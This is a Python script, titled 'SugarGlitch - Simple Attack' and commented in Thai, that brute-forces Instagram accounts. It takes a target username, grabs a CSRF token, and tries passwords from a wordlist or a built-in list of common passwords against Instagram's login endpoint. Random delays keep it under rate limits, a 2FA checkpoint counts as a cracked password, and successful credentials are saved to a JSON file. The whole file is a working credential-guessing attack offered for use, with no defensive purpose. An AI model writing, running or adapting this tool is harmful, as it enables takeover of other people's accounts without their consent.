#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
⚡ Simple Attack - โหมดง่ายที่สุด
Instagram Simple Brute Force
"""

import time
import random
import json
import requests
import os

class SimpleInstagramAttack:
    def __init__(self):
        self.session = requests.Session()
        self.target_username = ""
        self.password_list = []
        self.success_count = 0
        self.attempt_count = 0
        
        # Instagram API endpoints
        self.login_url = "https://www.instagram.com/accounts/login/ajax/"
        self.base_url = "https://www.instagram.com"
        
        # Headers แบบปกติ
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'x-csrftoken': '',
        }
    
    def get_csrf_token(self):
        """ดึง CSRF token"""
        try:
            print("🔑 กำลังดึง CSRF token...")
            
            response = self.session.get(f"{self.base_url}/accounts/login/")
            
            if 'csrftoken' in self.session.cookies:
                csrf_token = self.session.cookies['csrftoken']
                self.headers['x-csrftoken'] = csrf_token
                print(f"✅ ได้ CSRF token: {csrf_token[:20]}...")
                return True
            else:
                print("❌ ไม่พบ CSRF token")
                return False
                
        except Exception as e:
            print(f"❌ ไม่สามารถดึง CSRF token: {str(e)}")
            return False
    
    def load_passwords(self, password_file="whatilove1728.txt"):
        """โหลดรายการรหัสผ่าน"""
        try:
            if os.path.exists(password_file):
                with open(password_file, 'r', encoding='utf-8') as f:
                    self.password_list = [line.strip() for line in f if line.strip()]
                print(f"📋 โหลดรหัสผ่าน {len(self.password_list)} รายการจาก {password_file}")
            else:
                # รหัสผ่านตัวอย่าง
                self.password_list = [
                    "123456", "password", "123456789", "12345678", "12345",
                    "1234567", "1234567890", "qwerty", "abc123", "111111",
                    "password123", "admin", "letmein", "welcome", "monkey",
                    "iloveyou", "princess", "dragon", "sunshine", "master"
                ]
                print(f"📋 ใช้รหัสผ่านตัวอย่าง {len(self.password_list)} รายการ")
        except Exception as e:
            print(f"❌ ไม่สามารถโหลดรหัสผ่าน: {str(e)}")
    
    def try_login(self, username, password):
        """ลองล็อกอินผ่าน API"""
        try:
            print(f"🔐 ลองล็อกอิน: {username} / {password}")
            
            login_data = {
                'username': username,
                'password': password,
                'queryParams': {},
                'optIntoOneTap': 'false'
            }
            
            response = self.session.post(
                self.login_url,
                data=login_data,
                headers=self.headers
            )
            
            # ตรวจสอบผลลัพธ์
            if response.status_code == 200:
                data = response.json()
                
                if data.get('authenticated'):
                    print(f"🎉 ล็อกอินสำเร็จ! {username}:{password}")
                    return True
                elif 'checkpoint_required' in str(data):
                    print(f"⚠️ ต้อง verify (2FA): {username}:{password}")
                    return True  # ถือว่าสำเร็จเพราะรหัสผ่านถูก
                else:
                    print(f"❌ รหัสผ่านผิด")
                    return False
            else:
                print(f"❌ HTTP Error: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ เกิดข้อผิดพลาด: {str(e)}")
            return False
    
    def start_attack(self):
        """เริ่มการโจมตี"""
        print("\n⚡ เริ่ม Simple Attack!")
        print("="*50)
        
        # ขอ username เป้าหมาย
        self.target_username = input("👤 ใส่ username เป้าหมาย: ").strip()
        
        if not self.target_username:
            print("❌ ต้องใส่ username")
            return
        
        # โหลดรหัสผ่าน
        self.load_passwords()
        
        if not self.password_list:
            print("❌ ไม่มีรหัสผ่านให้ทดสอบ")
            return
        
        # ดึง CSRF token
        if not self.get_csrf_token():
            print("❌ ไม่สามารถเริ่มการโจมตีได้")
            return
        
        try:
            # ลองรหัสผ่านทีละตัว
            for i, password in enumerate(self.password_list, 1):
                print(f"\n📊 ความคืบหน้า: {i}/{len(self.password_list)}")
                
                self.attempt_count += 1
                
                # ลองล็อกอิน
                success = self.try_login(self.target_username, password)
                
                if success:
                    self.success_count += 1
                    
                    # บันทึกผลลัพธ์
                    result = {
                        "username": self.target_username,
                        "password": password,
                        "status": "SUCCESS",
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                        "method": "Simple API Attack"
                    }
                    
                    with open("simple_attack_success.json", "w") as f:
                        json.dump(result, f, indent=2)
                    
                    print(f"💾 บันทึกผลลัพธ์ในไฟล์ simple_attack_success.json")
                    print(f"🎯 ล็อกอินสำเร็จ! ใช้งานได้: {self.target_username}:{password}")
                    
                    # หยุดเมื่อสำเร็จ
                    break
                
                # รอก่อนลองครั้งต่อไป (ป้องกัน rate limiting)
                delay = random.uniform(5, 10)
                print(f"⏳ รอ {delay:.1f} วินาทีก่อนลองต่อ...")
                time.sleep(delay)
        
        except KeyboardInterrupt:
            print("\n\n⚠️ หยุดการทำงานโดยผู้ใช้")
        
        except Exception as e:
            print(f"\n❌ เกิดข้อผิดพลาด: {str(e)}")
        
        finally:
            # แสดงสรุปผล
            print(f"\n📊 สรุปผลการโจมตี:")
            print(f"🎯 เป้าหมาย: {self.target_username}")
            print(f"🔢 จำนวนครั้งที่ลอง: {self.attempt_count}")
            print(f"✅ สำเร็จ: {self.success_count}")

def main():
    """ฟังก์ชันหลัก"""
    print("🍭 SugarGlitch - Simple Attack")
    print("="*50)
    
    attacker = SimpleInstagramAttack()
    attacker.start_attack()

if __name__ == "__main__":
    main()
